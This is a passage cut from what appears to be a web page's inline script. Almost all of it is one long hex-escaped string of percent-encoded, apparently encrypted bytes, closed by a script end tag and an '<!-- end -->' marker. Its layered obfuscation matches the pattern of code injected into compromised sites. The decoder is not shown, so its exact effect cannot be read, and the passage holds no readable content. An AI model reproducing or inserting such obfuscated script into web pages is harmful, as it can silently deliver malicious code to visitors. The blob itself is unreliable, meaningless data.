25\x31\x66\x25\x32\x36\x25\x32\x35\x25\x31\x64\x25\x35\x63\x25\x35\x34\x25\x37\x66\x25\x31\x31\x25\x36\x30\x25\x37\x65\x25\x34\x34\x25\x32\x37\x25\x30\x35\x25\x36\x30\x25\x32\x31\x25\x30\x62\x25\x31\x31\x25\x32\x32\x25\x37\x31\x25\x33\x36\x25\x32\x32\x25\x32\x37\x25\x30\x30\x25\x33\x39\x25\x33\x66\x25\x33\x32\x25\x33\x62\x25\x30\x39\x25\x33\x36\x25\x33\x31\x25\x36\x66\x25\x35\x36\x25\x33\x63\x25\x36\x37\x25\x30\x38\x25\x36\x65\x25\x32\x30\x25\x36\x62\x25\x33\x63\x25\x35\x39\x25\x33\x37\x25\x37\x37\x25\x37\x35\x25\x32\x32\x25\x37\x34\x25\x37\x61\x25\x34\x38\x25\x30\x33\x25\x35\x30\x25\x30\x39\x25\x31\x62\x25\x37\x34\x25\x32\x66\x25\x37\x31\x25\x36\x34\x25\x32\x36\x25\x32\x39\x25\x35\x64\x25\x32\x66\x25\x37\x61\x25\x34\x62\x25\x32\x30\x25\x36\x32\x25\x30\x63\x25\x32\x36\x25\x30\x37\x25\x36\x62\x25\x37\x35\x25\x31\x30\x25\x34\x31\x25\x35\x36\x25\x32\x33\x25\x32\x36\x25\x32\x64\x25\x33\x39\x25\x30\x35\x25\x32\x34\x25\x33\x32\x25\x37\x61\x25\x36\x64\x25\x30\x31\x25\x31\x35\x25\x31\x38\x25\x37\x64\x25\x34\x30\x25\x30\x37\x25\x32\x31\x25\x33\x63\x25\x30\x61\x25\x37\x39\x25\x32\x34\x25\x36\x65\x25\x37\x31\x25\x35\x35\x25\x36\x32\x25\x36\x37\x25\x36\x35\x25\x32\x37\x25\x37\x62\x25\x33\x66\x25\x36\x33\x25\x32\x32\x25\x31\x34\x25\x32\x31\x25\x32\x32\x25\x37\x32\x25\x33\x61\x25\x32\x61\x25\x33\x39\x25\x33\x65\x25\x33\x64\x25\x31\x32\x25\x32\x62\x25\x33\x34\x25\x32\x65\x25\x33\x32\x25\x36\x62\x25\x33\x63\x25\x36\x63\x25\x33\x65\x25\x30\x32\x25\x32\x66\x25\x31\x62\x25\x34\x63\x25\x35\x36\x25\x37\x36\x25\x31\x61\x25\x34\x65\x25\x32\x31\x25\x33\x62\x25\x33\x38\x25\x33\x34\x25\x33\x65\x25\x34\x64\x25\x30\x33\x25\x37\x30\x25\x32\x33\x25\x33\x36\x25\x36\x32\x25\x31\x30\x25\x31\x61\x25\x32\x63\x25\x30\x36\x25\x30\x38\x25\x37\x66\x25\x35\x34\x25\x36\x38\x25\x31\x31\x25\x30\x35\x25\x32\x64\x25\x36\x66\x25\x33\x35\x25\x31\x36\x25\x36\x63\x25\x33\x65\x25\x34\x65\x25\x30\x64\x25\x33\x37\x25\x32\x34\x25\x33\x65\x25\x33\x64\x25\x31\x61\x25\x33\x32\x25\x32\x61\x25\x33\x30\x25\x36\x61\x25\x31\x31\x25\x32\x64\x25\x31\x37\x25\x32\x36\x25\x32\x65\x25\x37\x30\x25\x37\x36\x25\x36\x38\x25\x31\x61\x25\x32\x64\x25\x31\x31\x25\x32\x61\x25\x31\x32\x25\x33\x33\x25\x31\x35\x25\x32\x64\x25\x33\x63\x25\x36\x39\x25\x37\x61\x25\x34\x39\x25\x34\x30\x25\x31\x63\x25\x31\x31\x25\x33\x38\x25\x36\x35\x25\x31\x33\x25\x35\x34\x25\x32\x34\x25\x33\x31\x25\x36\x35\x25\x35\x33\x25\x36\x62\x25\x33\x31\x25\x32\x61\x25\x33\x30\x25\x31\x65\x25\x33\x39\x25\x32\x63\x25\x33\x63\x25\x33\x33\x25\x35\x36\x25\x36\x62\x25\x30\x30\x25\x33\x62\x25\x31\x31\x25\x31\x61\x25\x33\x63\x25\x30\x31\x25\x34\x62\x25\x32\x35\x25\x35\x31\x25\x32\x61\x25\x37\x30\x25\x37\x34\x25\x35\x63\x25\x37\x36\x25\x33\x30\x25\x37\x36\x25\x32\x66\x25\x37\x34\x25\x37\x34\x25\x37\x38\x25\x30\x62\x25\x37\x34\x25\x34\x31\x25\x31\x34\x25\x31\x30\x25\x36\x36\x25\x32\x30\x25\x33\x35\x25\x31\x39\x25\x32\x38\x25\x31\x39\x25\x36\x65\x25\x30\x61\x25\x37\x39\x25\x33\x38\x25\x37\x37\x25\x32\x39\x25\x33\x66\x25\x31\x61\x25\x32\x30\x25\x32\x35\x25\x33\x35\x25\x36\x38\x25\x31\x36\x25\x36\x64\x25\x36\x62\x25\x33\x31\x25\x36\x34\x25\x37\x33\x25\x32\x66\x25\x33\x37\x25\x32\x62\x25\x32\x63\x25\x31\x65\x25\x33\x31\x25\x32\x35\x25\x35\x30\x25\x35\x31\x25\x33\x31\x25\x30\x61\x25\x36\x30\x25\x37\x64\x25\x33\x65\x25\x33\x62\x25\x30\x66\x25\x34\x61\x25\x30\x66\x25\x34\x34\x25\x35\x66\x25\x37\x66\x25\x36\x63\x25\x37\x64\x25\x36\x39\x25\x33\x38\x25\x30\x36\x25\x33\x34\x25\x33\x32\x25\x32\x31\x25\x34\x35\x25\x31\x62\x25\x31\x63\x25\x32\x39\x25\x31\x64\x25\x30\x61\x25\x32\x61\x25\x30\x31\x25\x32\x61\x25\x32\x36\x25\x37\x38\x25\x32\x62\x25\x33\x62\x25\x33\x61\x25\x31\x32\x25\x36\x38\x25\x33\x39\x25\x33\x30\x25\x33\x62\x25\x35\x32\x25\x33\x65\x25\x32\x34\x25\x31\x30\x25\x30\x32\x25\x32\x62\x25\x33\x35\x25\x37\x34\x25\x37\x66\x25\x32\x35\x25\x31\x36\x25\x32\x62\x25\x32\x36\x25\x36\x31\x25\x32\x33\x25\x33\x66\x25\x33\x64\x25\x33\x65\x25\x33\x36\x25\x32\x31\x25\x30\x63\x25\x33\x32\x25\x31\x38\x25\x32\x65\x25\x33\x33\x25\x37\x30\x25\x36\x33\x25\x31\x30\x25\x31\x62\x25\x35\x39\x25\x30\x61\x25\x31\x38\x25\x32\x63\x25\x33\x38\x25\x31\x61\x25\x33\x31\x25\x33\x62\x25\x32\x36\x25\x33\x39\x25\x33\x37\x25\x31\x63\x25\x34\x35\x25\x37\x65\x25\x34\x63\x25\x33\x62\x25\x36\x36\x25\x32\x38\x25\x33\x65\x25\x32\x62\x25\x30\x62\x25\x31\x34\x25\x31\x35\x25\x32\x64\x25\x32\x35\x25\x36\x39\x25\x35\x32\x25\x33\x34\x25\x30\x30\x25\x34\x38\x25\x33\x64\x25\x33\x65\x25\x33\x31\x25\x33\x31\x25\x32\x63\x25\x37\x65\x25\x36\x65\x25\x33\x36\x25\x31\x37\x25\x33\x36\x25\x30\x37\x25\x31\x66\x25\x33\x39\x25\x36\x64\x25\x31\x35\x25\x32\x38\x25\x32\x62\x25\x30\x35\x25\x33\x39\x25\x32\x65\x25\x37\x62\x25\x34\x32\x25\x37\x66\x25\x33\x39\x25\x32\x39\x25\x31\x33\x25\x31\x61\x25\x30\x62\x25\x32\x36\x25\x30\x66\x25\x33\x36\x25\x36\x35\x25\x35\x63\x25\x31\x62\x25\x32\x30\x25\x32\x38\x25\x32\x33\x25\x36\x65\x25\x32\x61\x25\x36\x36\x25\x34\x63\x25\x36\x32\x25\x34\x63\x25\x37\x66\x25\x34\x64\x25\x37\x39\x25\x34\x30\x25\x36\x61\x25\x36\x65\x25\x30\x63\x25\x34\x65\x25\x36\x32\x25\x36\x66\x25\x36\x66\x25\x36\x30\x25\x31\x66\x25\x36\x37\x25\x31\x31\x25\x37\x61\x25\x31\x37\x25\x36\x64\x25\x32\x34\x25\x37\x35\x25\x31\x30\x25\x35\x37\x25\x36\x35\x25\x33\x36\x25\x36\x61\x25\x33\x64\x25\x30\x61\x25\x32\x37\x25\x30\x34\x25\x33\x39\x25\x30\x61\x25\x32\x36\x25\x32\x31\x25\x30\x62\x25\x33\x61\x25\x35\x61\x25\x37\x64\x25\x31\x37\x25\x33\x63\x25\x31\x66\x25\x33\x64\x25\x30\x34\x25\x31\x64\x25\x31\x31\x25\x33\x30\x25\x36\x66\x25\x33\x63\x25\x37\x31\x25\x32\x36\x25\x36\x39\x25\x31\x31\x25\x31\x30\x25\x31\x65\x25\x30\x37\x25\x37\x61\x25\x30\x63\x25\x34\x38\x25\x37\x66\x25\x34\x34\x25\x35\x31\x25\x35\x35\x25\x33\x33\x25\x33\x38\x25\x36\x35\x25\x34\x36\x25\x36\x37\x25\x34\x31\x25\x33\x65\x25\x33\x61\x25\x32\x65\x25\x35\x38\x25\x33\x36\x25\x32\x31\x25\x31\x35\x25\x37\x37\x25\x32\x34\x25\x37\x38\x25\x37\x38\x25\x37\x34\x25\x33\x39\x25\x37\x61\x25\x33\x31\x25\x36\x62\x25\x31\x36\x25\x35\x35\x25\x35\x31\x25\x37\x64\x25\x32\x30\x25\x37\x62\x25\x36\x35\x25\x33\x32\x25\x31\x38\x25\x33\x33\x25\x32\x62\x25\x31\x38\x25\x33\x37\x25\x32\x30\x25\x32\x36\x25\x32\x61\x25\x31\x33\x25\x35\x37\x25\x33\x32\x25\x36\x37\x25\x36\x61\x25\x36\x31\x25\x37\x62\x25\x33\x64\x25\x33\x61\x25\x31\x61\x25\x34\x34\x25\x32\x37\x25\x33\x34\x25\x30\x65\x25\x33\x63\x25\x35\x61\x25\x32\x36\x25\x37\x62\x25\x32\x63\x25\x30\x31\x25\x32\x64\x25\x33\x38\x25\x37\x65\x25\x37\x62\x25\x37\x36\x25\x36\x34\x25\x34\x32\x25\x31\x31\x25\x30\x32\x25\x37\x30\x25\x32\x38\x25\x32\x32\x25\x32\x62\x25\x37\x32\x25\x37\x38\x25\x35\x66\x25\x34\x64\x25\x37\x39\x25\x37\x32\x25\x36\x63\x25\x32\x30\x25\x32\x33\x25\x31\x65\x25\x33\x30\x25\x33\x34\x25\x33\x37\x25\x34\x65\x25\x33\x61\x25\x37\x34\x25\x32\x62\x25\x33\x65\x25\x36\x62\x25\x30\x62\x25\x31\x34\x25\x30\x64\x25\x31\x30\x25\x33\x61\x25\x31\x64\x25\x32\x61\x25\x33\x31\x25\x35\x33\x25\x36\x66\x25\x37\x64\x25\x33\x65\x25\x34\x63\x25\x33\x34\x25\x31\x62\x25\x32\x35\x25\x31\x38\x25\x30\x36\x25\x30\x35\x25\x34\x66\x25\x36\x64\x25\x34\x39\x25\x33\x34\x25\x33\x34\x25\x33\x38\x25\x33\x33\x25\x34\x37\x25\x31\x35\x25\x31\x64\x25\x30\x65\x25\x35\x61\x25\x32\x31\x25\x33\x30\x25\x32\x62\x25\x37\x35\x25\x37\x31\x25\x36\x39\x27\x29\x3b');</script><!-- end -->